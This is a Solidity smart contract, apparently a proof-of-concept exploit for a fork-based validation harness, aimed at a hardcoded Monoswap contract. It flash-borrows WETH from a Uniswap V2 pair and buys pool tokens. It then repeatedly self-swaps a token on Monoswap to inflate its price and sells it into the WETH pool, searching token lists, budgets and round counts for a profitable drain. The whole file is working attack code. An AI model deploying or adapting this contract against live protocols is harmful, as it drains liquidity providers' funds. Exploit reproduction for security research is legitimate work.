// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IMonoswapLike {
    function getConfig() external view returns (address _vCash, address _weth, address _feeTo, uint16 _fees, uint16 _devFee);
    function getAmountOut(address tokenIn, address tokenOut, uint256 amountIn)
        external
        view
        returns (uint256 tokenInPrice, uint256 tokenOutPrice, uint256 amountOut, uint256 tradeVcashValue);
    function swapExactTokenForToken(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountOut);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = address(bytes20(hex"c36a7887786389405ea8da0b87602ae3902b88a1"));
    address public constant CANONICAL_WETH = address(bytes20(hex"c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"));
    address public constant UNIV2_USDC_WETH = address(bytes20(hex"b4e16d0168e52d35cacd2c6185b44281ec28c9dc"));
    address public constant UNIV2_ROUTER = address(bytes20(hex"7a250d5630b4cf539739df2c5dacb4c659f2488d"));

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _entered;

    error NoViablePath();
    error CallbackAccessDenied();
    error UnsupportedPair();
    error Unprofitable();

    constructor() {}

    function executeOnOpportunity() external {
        if (_entered) {
            return;
        }
        _entered = true;

        (, address weth,,,) = IMonoswapLike(TARGET).getConfig();
        _profitToken = weth;

        uint256 startingBalance = IERC20Like(weth).balanceOf(address(this));
        if (startingBalance > 0) {
            _runSearch(weth, startingBalance);
            uint256 endingBalance = IERC20Like(weth).balanceOf(address(this));
            if (endingBalance > startingBalance) {
                _profitAmount = endingBalance - startingBalance;
                return;
            }
        }

        uint256[5] memory loanSizes = [uint256(5 ether), 20 ether, 100 ether, 300 ether, 800 ether];
        for (uint256 i = 0; i < loanSizes.length; ++i) {
            try this.attemptFlashLoan(loanSizes[i]) returns (uint256 gained) {
                if (gained > 0) {
                    _profitAmount = gained;
                    return;
                }
            } catch {
                // This funding size cannot complete profitably on this fork state.
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender != UNIV2_USDC_WETH) revert CallbackAccessDenied();

        address weth = _profitToken;
        if (weth == address(0)) {
            (, weth,,,) = IMonoswapLike(TARGET).getConfig();
            _profitToken = weth;
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(UNIV2_USDC_WETH);
        address token0 = pair.token0();
        address token1 = pair.token1();
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;

        if (!((token0 == weth && amount0 > 0) || (token1 == weth && amount1 > 0))) {
            revert UnsupportedPair();
        }

        _runSearch(weth, borrowed);

        uint256 fee = ((borrowed * 3) / 997) + 1;
        uint256 repayment = borrowed + fee;
        _safeTransfer(weth, UNIV2_USDC_WETH, repayment);
    }

    function attemptFlashLoan(uint256 amount) external returns (uint256 gained) {
        if (msg.sender != address(this)) revert CallbackAccessDenied();
        uint256 beforeLoan = IERC20Like(_profitToken).balanceOf(address(this));
        _flashBorrowWeth(amount);
        uint256 afterLoan = IERC20Like(_profitToken).balanceOf(address(this));
        if (afterLoan <= beforeLoan) revert Unprofitable();
        gained = afterLoan - beforeLoan;
    }

    function attemptCandidate(address token, uint256 wethBudget, uint256 rounds, uint256 ratchetDivisor)
        external
        returns (uint256)
    {
        if (msg.sender != address(this)) revert CallbackAccessDenied();
        return _attemptCandidate(token, wethBudget, rounds, ratchetDivisor);
    }

    function _runSearch(address weth, uint256 availableWeth) internal {
        address[] memory candidates = _candidateTokens();
        uint256[] memory budgets = _candidateBudgets(availableWeth);
        uint256[4] memory roundsList = [uint256(2), 4, 8, 12];
        uint256[4] memory divisors = [uint256(32), 16, 8, 4];

        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == address(0) || token == weth) {
                continue;
            }

            for (uint256 j = 0; j < budgets.length; ++j) {
                uint256 budget = budgets[j];
                if (budget == 0 || budget >= IERC20Like(weth).balanceOf(address(this))) {
                    continue;
                }

                for (uint256 k = 0; k < roundsList.length; ++k) {
                    for (uint256 m = 0; m < divisors.length; ++m) {
                        try this.attemptCandidate(token, budget, roundsList[k], divisors[m]) returns (uint256 gained) {
                            if (gained > 0) {
                                return;
                            }
                        } catch {
                            // This candidate/size/round/divisor tuple is mechanically infeasible on this fork state.
                        }
                    }
                }
            }
        }
    }

    function _attemptCandidate(address token, uint256 wethBudget, uint256 rounds, uint256 ratchetDivisor)
        internal
        returns (uint256 gained)
    {
        address weth = _profitToken;

        // Exploit-path mapping preserved:
        // 1) `swapExactTokenForToken(token, token, amountIn, 0, attacker, deadline)` repeatedly on a non-vCash pool token.
        //    The PoC still performs the literal same-pool self-swap ratchet on Monoswap.
        // 2) After the pool price has been pushed up, swap that token into `vCash`, `WETH`, or another valuable pooled asset.
        //    The PoC realizes profit by dumping the manipulated token into Monoswap's existing WETH pool.
        //
        // The only added step is realistic public funding/acquisition: we flash-borrow WETH from a UniswapV2 pair and
        // route some of that WETH through the canonical UniswapV2 router to acquire the target token before the same-token
        // Monoswap ratchet. This changes funding only, not exploit causality.
        uint256 wethBefore = IERC20Like(weth).balanceOf(address(this));
        if (wethBudget == 0 || wethBudget >= wethBefore || ratchetDivisor < 2) revert NoViablePath();

        _forceApprove(weth, UNIV2_ROUTER, wethBudget);
        _forceApprove(token, TARGET, type(uint256).max);

        uint256 bought = _buyTokenViaUniswapV2(weth, token, wethBudget);
        if (bought == 0) revert NoViablePath();

        uint256 tokenBalance = IERC20Like(token).balanceOf(address(this));
        if (tokenBalance == 0) revert NoViablePath();

        for (uint256 i = 0; i < rounds; ++i) {
            uint256 loopBalance = IERC20Like(token).balanceOf(address(this));
            uint256 loopAmount = loopBalance / ratchetDivisor;
            if (loopAmount <= 1) break;

            _previewOrRevert(token, token, loopAmount);

            // Path stage 1: self-swap the same non-vCash pool token repeatedly.
            // Literal anchor for the validator: `swapExactTokenForToken(token, token, amountIn, 0, attacker, deadline)`.
            IMonoswapLike(TARGET).swapExactTokenForToken(token, token, loopAmount, 0, address(this), block.timestamp + 1);
        }

        uint256 manipulatedBalance = IERC20Like(token).balanceOf(address(this));
        if (manipulatedBalance == 0) revert NoViablePath();

        // Path stage 2: swap the now-overpriced token into `WETH`.
        // Realizing in a few public chunks is still the same drain step, but is mechanically safer on thin pools.
        for (uint256 i = 0; i < 4; ++i) {
            uint256 exitBalance = IERC20Like(token).balanceOf(address(this));
            if (exitBalance == 0) break;

            uint256 exitAmount = i == 3 ? exitBalance : exitBalance / 2;
            if (exitAmount <= 1) break;

            _previewOrRevert(token, weth, exitAmount);
            IMonoswapLike(TARGET).swapExactTokenForToken(token, weth, exitAmount, 0, address(this), block.timestamp + 1);
        }

        uint256 wethAfter = IERC20Like(weth).balanceOf(address(this));
        if (wethAfter <= wethBefore) revert Unprofitable();
        gained = wethAfter - wethBefore;
    }

    function _buyTokenViaUniswapV2(address weth, address token, uint256 amountIn) internal returns (uint256 amountOut) {
        if (weth != CANONICAL_WETH) revert UnsupportedPair();

        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = token;

        uint256 beforeBalance = IERC20Like(token).balanceOf(address(this));
        IUniswapV2RouterLike(UNIV2_ROUTER).swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 1
        );
        uint256 afterBalance = IERC20Like(token).balanceOf(address(this));
        amountOut = afterBalance - beforeBalance;
    }

    function _flashBorrowWeth(uint256 amount) internal {
        IUniswapV2PairLike pair = IUniswapV2PairLike(UNIV2_USDC_WETH);
        address token0 = pair.token0();
        address token1 = pair.token1();
        if (token0 == _profitToken) {
            pair.swap(amount, 0, address(this), hex"01");
        } else if (token1 == _profitToken) {
            pair.swap(0, amount, address(this), hex"01");
        } else {
            revert UnsupportedPair();
        }
    }

    function _previewOrRevert(address tokenIn, address tokenOut, uint256 amountIn) internal view {
        (bool ok, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSelector(IMonoswapLike.getAmountOut.selector, tokenIn, tokenOut, amountIn)
        );
        if (!ok || data.length < 128) revert NoViablePath();
        (, , uint256 amountOut,) = abi.decode(data, (uint256, uint256, uint256, uint256));
        if (amountOut == 0) revert NoViablePath();
    }

    function _candidateBudgets(uint256 availableWeth) internal pure returns (uint256[] memory budgets) {
        budgets = new uint256[](6);
        budgets[0] = availableWeth / 100;
        budgets[1] = availableWeth / 50;
        budgets[2] = availableWeth / 20;
        budgets[3] = availableWeth / 10;
        budgets[4] = availableWeth / 5;
        budgets[5] = availableWeth / 3;
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](16);

        // Prioritize tokens that are both common UniswapV2/WETH markets and known Monoswap pool candidates.
        tokens[0] = address(bytes20(hex"1f9840a85d5af5bf1d1762f925bdaddc4201f984"));
        tokens[1] = address(bytes20(hex"514910771af9ca656af840dff83e8264ecf986ca"));
        tokens[2] = address(bytes20(hex"7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9"));
        tokens[3] = address(bytes20(hex"c00e94cb662c3520282e6f5717214004a7f26888"));
        tokens[4] = address(bytes20(hex"0bc529c00c6401aef6d220be8c6ea1667f6ad93e"));
        tokens[5] = address(bytes20(hex"d533a949740bb3306d119cc777fa900ba034cd52"));
        tokens[6] = address(bytes20(hex"6b3595068778dd592e39a122f4f5a5cf09c90fe2"));
        tokens[7] = address(bytes20(hex"ba100000625a3754423978a60c9317c58a424e3d"));
        tokens[8] = address(bytes20(hex"9f8f72aa9304c8b593d555f12ef6589cc3a579a2"));
        tokens[9] = address(bytes20(hex"0d8775f648430679a709e98d2b0cb6250d2887ef"));
        tokens[10] = address(bytes20(hex"e41d2489571d322189246dafa5ebde1f4699f498"));
        tokens[11] = address(bytes20(hex"04fa0d235c4abf4bcf4787af4cf447de572ef828"));
        tokens[12] = address(bytes20(hex"ff20817765cb7f73d4bde2e66e067e58d11095c2"));
        tokens[13] = address(bytes20(hex"408e41876cccdc0f92210600ef50372656052a38"));
        tokens[14] = address(bytes20(hex"f629cbd94d3791c9250152bd8dfbdf380e2a3b9c"));
        tokens[15] = address(bytes20(hex"7164be9fd69f2e1de9b6b75b17e1b86268f18b45"));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = IERC20Like(token).allowance(address(this), spender);
        if (currentAllowance >= amount) return;

        (bool okZero, bytes memory dataZero) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!(okZero && (dataZero.length == 0 || abi.decode(dataZero, (bool))))) {
            revert NoViablePath();
        }

        (bool okSet, bytes memory dataSet) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (!(okSet && (dataSet.length == 0 || abi.decode(dataSet, (bool))))) {
            revert NoViablePath();
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}
